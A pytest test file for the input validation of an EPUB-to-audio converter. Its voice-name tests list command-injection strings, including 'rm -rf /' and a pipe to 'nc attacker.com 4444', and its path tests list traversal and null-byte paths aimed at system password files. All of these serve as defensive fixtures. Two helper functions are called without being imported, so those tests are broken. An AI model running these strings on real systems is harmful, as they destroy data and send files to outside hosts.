"""
Unit tests for the validation system.
"""

import os
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch
import pytest

from validation import (
    ValidationError,
    validate_epub_file,
    validate_output_path,
    validate_voice,
    validate_jobs,
    validate_format,
    check_system_dependencies,
    create_safe_output_directory
)


@pytest.mark.unit
class TestValidateEpubFile:
    """Test cases for EPUB file validation."""
    
    def test_validate_epub_file_success(self, minimal_epub):
        """Test successful EPUB file validation."""
        valid, error = validate_epub_file(str(minimal_epub))
        assert valid is True
        assert "is valid" in error
    
    def test_validate_epub_file_nonexistent(self, temp_dir):
        """Test validation of non-existent EPUB file."""
        nonexistent_file = str(temp_dir / "nonexistent.epub")
        valid, error = validate_epub_file(nonexistent_file)
        assert valid is False
        assert "does not exist" in error
    
    def test_validate_epub_file_not_epub_extension(self, temp_dir):
        """Test validation of file without .epub extension."""
        text_file = temp_dir / "test.txt"
        text_file.write_text("not an epub")
        
        valid, error = validate_epub_file(str(text_file))
        assert valid is False
        assert "must have .epub extension" in error
    
    def test_validate_epub_file_malformed(self, malformed_epub):
        """Test validation of malformed EPUB file."""
        valid, error = validate_epub_file(str(malformed_epub))
        assert valid is False
        assert "Invalid EPUB structure" in error
    
    def test_validate_epub_file_empty(self, empty_epub):
        """Test validation of empty EPUB file."""
        valid, error = validate_epub_file(str(empty_epub))
        # Empty EPUB should still be structurally valid
        assert valid is True
    
    def test_validate_epub_file_directory_traversal(self, temp_dir):
        """Test validation rejects directory traversal attempts."""
        malicious_path = "../../../etc/passwd"
        valid, error = validate_epub_file(malicious_path)
        assert valid is False
        assert "Invalid file path" in error
    
    def test_validate_epub_file_permission_error(self, temp_dir):
        """Test validation handles permission errors gracefully."""
        epub_file = temp_dir / "test.epub"
        epub_file.write_bytes(b"fake epub content")
        
        # Make file unreadable
        os.chmod(epub_file, 0o000)
        
        try:
            valid, error = validate_epub_file(str(epub_file))
            assert valid is False
            assert "Permission denied" in error or "cannot be read" in error
        finally:
            # Restore permissions for cleanup
            os.chmod(epub_file, 0o644)


@pytest.mark.unit
class TestValidateOutputPath:
    """Test cases for output path validation."""
    
    def test_validate_output_path_success(self, temp_dir):
        """Test successful output path validation."""
        output_path = str(temp_dir / "output.mp3")
        valid, result = validate_output_path(output_path)
        assert valid is True
        assert result == output_path
    
    def test_validate_output_path_directory_traversal(self):
        """Test validation rejects directory traversal attempts."""
        malicious_path = "../../../etc/passwd"
        valid, error = validate_output_path(malicious_path)
        assert valid is False
        assert "Invalid file path" in error
    
    def test_validate_output_path_invalid_extension(self, temp_dir):
        """Test validation of invalid file extensions."""
        output_path = str(temp_dir / "output.txt")
        valid, error = validate_output_path(output_path)
        assert valid is False
        assert "Invalid file extension" in error
    
    def test_validate_output_path_absolute_path(self, temp_dir):
        """Test validation of absolute paths."""
        output_path = str(temp_dir / "output.aiff")
        valid, result = validate_output_path(output_path)
        assert valid is True
        assert result == output_path
    
    def test_validate_output_path_special_characters(self, temp_dir):
        """Test validation handles special characters."""
        output_path = str(temp_dir / "output with spaces.mp3")
        valid, result = validate_output_path(output_path)
        assert valid is True
        assert result == output_path
    
    def test_validate_output_path_very_long_name(self, temp_dir):
        """Test validation of very long file names."""
        long_name = "a" * 300 + ".mp3"
        output_path = str(temp_dir / long_name)
        valid, error = validate_output_path(output_path)
        assert valid is False
        assert "too long" in error.lower()


@pytest.mark.unit
@pytest.mark.security
class TestValidateVoice:
    """Test cases for voice validation."""
    
    def test_validate_voice_none(self):
        """Test validation of None voice (should use system default)."""
        valid, error = validate_voice(None)
        assert valid is True
        assert "system default" in error
    
    def test_validate_voice_normal(self):
        """Test validation of normal voice names."""
        valid, error = validate_voice("Samantha")
        assert valid is True
        assert "is valid" in error
    
    def test_validate_voice_enhanced(self):
        """Test validation of enhanced voice names with parentheses."""
        valid, error = validate_voice("Zoe (Enhanced)")
        assert valid is True
        assert "is valid" in error
    
    def test_validate_voice_multilingual(self):
        """Test validation of multilingual voice names."""
        valid, error = validate_voice("Ava (Premium)")
        assert valid is True
        assert "is valid" in error
    
    def test_validate_voice_command_injection(self):
        """Test validation rejects command injection attempts."""
        malicious_voices = [
            "Samantha; rm -rf /",
            "Samantha && cat /etc/passwd",
            "Samantha | nc attacker.com 4444",
            "Samantha`whoami`",
            "Samantha$(whoami)",
            "Samantha > /tmp/malicious",
            "Samantha < /etc/passwd",
            'Samantha"dangerous"',
            "Samantha'dangerous'",
        ]
        
        for voice in malicious_voices:
            valid, error = validate_voice(voice)
            assert valid is False, f"Should reject malicious voice: {voice}"
            assert "Invalid character" in error
    
    def test_validate_voice_directory_traversal(self):
        """Test validation rejects directory traversal attempts."""
        malicious_voices = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "voice/../../../etc/passwd",
        ]
        
        for voice in malicious_voices:
            valid, error = validate_voice(voice)
            assert valid is False, f"Should reject traversal attempt: {voice}"
            assert "Invalid voice name format" in error
    
    def test_validate_voice_too_long(self):
        """Test validation rejects overly long voice names."""
        long_voice = "a" * 200
        valid, error = validate_voice(long_voice)
        assert valid is False
        assert "too long" in error
    
    def test_validate_voice_unbalanced_parentheses(self):
        """Test validation rejects unbalanced parentheses."""
        invalid_voices = [
            "Zoe (Enhanced",
            "Zoe Enhanced)",
            "Zoe ((Enhanced)",
            "Zoe (Enhanced))",
        ]
        
        for voice in invalid_voices:
            valid, error = validate_voice(voice)
            assert valid is False, f"Should reject unbalanced parentheses: {voice}"
            assert "Unbalanced parentheses" in error
    
    def test_validate_voice_empty_string(self):
        """Test validation of empty string voice."""
        valid, error = validate_voice("")
        assert valid is True
        assert "system default" in error


@pytest.mark.unit
class TestValidateJobs:
    """Test cases for jobs validation."""
    
    def test_validate_jobs_none(self):
        """Test validation of None jobs (should use auto)."""
        valid, error = validate_jobs(None)
        assert valid is True
        assert "auto" in error
    
    def test_validate_jobs_positive_integer(self):
        """Test validation of positive integer jobs."""
        valid, error = validate_jobs(4)
        assert valid is True
        assert "4 jobs" in error
    
    def test_validate_jobs_zero(self):
        """Test validation rejects zero jobs."""
        valid, error = validate_jobs(0)
        assert valid is False
        assert "must be positive" in error
    
    def test_validate_jobs_negative(self):
        """Test validation rejects negative jobs."""
        valid, error = validate_jobs(-1)
        assert valid is False
        assert "must be positive" in error
    
    def test_validate_jobs_very_large(self):
        """Test validation rejects unreasonably large job counts."""
        valid, error = validate_jobs(1000)
        assert valid is False
        assert "too many" in error.lower()


@pytest.mark.unit
class TestValidateFormat:
    """Test cases for format validation."""
    
    def test_validate_format_aiff(self):
        """Test validation of AIFF format."""
        valid, error = validate_format("aiff")
        assert valid is True
        assert "AIFF format" in error
    
    def test_validate_format_mp3(self):
        """Test validation of MP3 format."""
        valid, error = validate_format("mp3")
        assert valid is True
        assert "MP3 format" in error
    
    def test_validate_format_invalid(self):
        """Test validation rejects invalid formats."""
        invalid_formats = ["wav", "m4a", "flac", "ogg", "invalid"]
        
        for fmt in invalid_formats:
            valid, error = validate_format(fmt)
            assert valid is False, f"Should reject invalid format: {fmt}"
            assert "Invalid format" in error
    
    def test_validate_format_none(self):
        """Test validation of None format."""
        valid, error = validate_format(None)
        assert valid is False
        assert "Format is required" in error
    
    def test_validate_format_case_insensitive(self):
        """Test validation is case insensitive."""
        valid_formats = ["AIFF", "MP3", "Aiff", "Mp3"]
        
        for fmt in valid_formats:
            valid, error = validate_format(fmt)
            assert valid is True, f"Should accept case variation: {fmt}"


@pytest.mark.unit
class TestCheckSystemDependencies:
    """Test cases for system dependency checking."""
    
    def test_check_system_dependencies_success(self, mock_system_dependencies):
        """Test successful system dependency check."""
        valid, error = check_system_dependencies()
        assert valid is True
        assert "available" in error
    
    def test_check_system_dependencies_say_missing(self):
        """Test system dependency check when 'say' command is missing."""
        with patch('validation.subprocess.run') as mock_run:
            mock_run.side_effect = FileNotFoundError()
            
            valid, error = check_system_dependencies()
            assert valid is False
            assert "say' command not found" in error
    
    def test_check_system_dependencies_ffmpeg_missing(self):
        """Test system dependency check when 'ffmpeg' command is missing."""
        with patch('validation.subprocess.run') as mock_run:
            def side_effect(cmd, **kwargs):
                if cmd[0] == 'say':
                    return Mock(returncode=0)
                elif cmd[0] == 'ffmpeg':
                    raise FileNotFoundError()
                
            mock_run.side_effect = side_effect
            
            valid, error = check_system_dependencies()
            assert valid is False
            assert "ffmpeg' not found" in error
    
    def test_check_system_dependencies_timeout(self):
        """Test system dependency check handles timeouts."""
        with patch('validation.subprocess.run') as mock_run:
            from subprocess import TimeoutExpired
            mock_run.side_effect = TimeoutExpired("say", 5)
            
            valid, error = check_system_dependencies()
            assert valid is False
            assert "not available" in error or "not found" in error


@pytest.mark.unit
@pytest.mark.filesystem
class TestCreateSafeOutputDirectory:
    """Test cases for safe output directory creation."""
    
    def test_create_safe_output_directory_success(self, temp_dir):
        """Test successful output directory creation."""
        output_name = "test_book"
        base_dir = str(temp_dir / "output")
        
        result_dir = create_safe_output_directory(output_name, base_dir)
        
        assert Path(result_dir).exists()
        assert Path(result_dir).is_dir()
        assert output_name in result_dir
    
    def test_create_safe_output_directory_existing(self, temp_dir):
        """Test output directory creation when directory already exists."""
        output_name = "test_book"
        base_dir = str(temp_dir / "output")
        
        # Create directory first
        first_dir = create_safe_output_directory(output_name, base_dir)
        
        # Create again - should work without error
        second_dir = create_safe_output_directory(output_name, base_dir)
        
        assert first_dir == second_dir
        assert Path(second_dir).exists()
    
    def test_create_safe_output_directory_invalid_name(self, temp_dir):
        """Test output directory creation with invalid names."""
        base_dir = str(temp_dir / "output")
        
        invalid_names = [
            "../../../etc",
            "..\\..\\..\\windows",
            "name/with/slashes",
            "name\\with\\backslashes",
            "name:with:colons",
            "name|with|pipes",
            "name<with>brackets",
            'name"with"quotes',
        ]
        
        for name in invalid_names:
            with pytest.raises(ValidationError) as exc_info:
                create_safe_output_directory(name, base_dir)
            assert "Invalid output name" in str(exc_info.value)
    
    def test_create_safe_output_directory_permission_error(self, temp_dir):
        """Test output directory creation handles permission errors."""
        output_name = "test_book"
        base_dir = str(temp_dir / "readonly")
        
        # Create base directory and make it read-only
        os.makedirs(base_dir)
        os.chmod(base_dir, 0o444)
        
        try:
            with pytest.raises(ValidationError) as exc_info:
                create_safe_output_directory(output_name, base_dir)
            assert "Permission denied" in str(exc_info.value)
        finally:
            # Restore permissions for cleanup
            os.chmod(base_dir, 0o755)


@pytest.mark.unit
class TestValidateEpubStructure:
    """Test cases for EPUB structure validation."""
    
    def test_validate_epub_structure_success(self, minimal_epub):
        """Test successful EPUB structure validation."""
        valid, error = _validate_epub_structure(str(minimal_epub))
        assert valid is True
        assert "valid" in error
    
    def test_validate_epub_structure_not_zip(self, temp_dir):
        """Test EPUB structure validation with non-ZIP file."""
        fake_epub = temp_dir / "fake.epub"
        fake_epub.write_text("not a zip file")
        
        valid, error = _validate_epub_structure(str(fake_epub))
        assert valid is False
        assert "ZIP" in error or "archive" in error
    
    def test_validate_epub_structure_missing_mimetype(self, temp_dir):
        """Test EPUB structure validation with missing mimetype."""
        import zipfile
        
        epub_path = temp_dir / "no_mimetype.epub"
        with zipfile.ZipFile(epub_path, 'w') as zf:
            zf.writestr("META-INF/container.xml", "fake container")
        
        valid, error = _validate_epub_structure(str(epub_path))
        assert valid is False
        assert "mimetype" in error
    
    def test_validate_epub_structure_missing_container(self, temp_dir):
        """Test EPUB structure validation with missing container.xml."""
        import zipfile
        
        epub_path = temp_dir / "no_container.epub"
        with zipfile.ZipFile(epub_path, 'w') as zf:
            zf.writestr("mimetype", "application/epub+zip")
        
        valid, error = _validate_epub_structure(str(epub_path))
        assert valid is False
        assert "container.xml" in error


@pytest.mark.unit
@pytest.mark.security
class TestValidateFilePath:
    """Test cases for file path validation."""
    
    def test_validate_file_path_success(self, temp_dir):
        """Test successful file path validation."""
        valid_path = str(temp_dir / "test.txt")
        valid, error = _validate_file_path(valid_path)
        assert valid is True
        assert "valid" in error
    
    def test_validate_file_path_directory_traversal(self):
        """Test file path validation rejects directory traversal."""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "file/../../../etc/passwd",
        ]
        
        for path in traversal_paths:
            valid, error = _validate_file_path(path)
            assert valid is False, f"Should reject traversal path: {path}"
            assert "Invalid file path" in error
    
    def test_validate_file_path_null_bytes(self):
        """Test file path validation rejects null bytes."""
        null_paths = [
            "file\x00.txt",
            "\x00etc/passwd",
            "file.txt\x00",
        ]
        
        for path in null_paths:
            valid, error = _validate_file_path(path)
            assert valid is False, f"Should reject null byte path: {path}"
            assert "Invalid file path" in error
    
    def test_validate_file_path_very_long(self):
        """Test file path validation rejects overly long paths."""
        long_path = "a" * 5000 + ".txt"
        valid, error = _validate_file_path(long_path)
        assert valid is False
        assert "too long" in error.lower()
    
    def test_validate_file_path_relative_ok(self, temp_dir):
        """Test file path validation accepts safe relative paths."""
        safe_relative_paths = [
            "output/test.txt",
            "books/mybook.epub",
            "audio/chapter1.aiff",
        ]
        
        for path in safe_relative_paths:
            valid, error = _validate_file_path(path)
            assert valid is True, f"Should accept safe relative path: {path}" 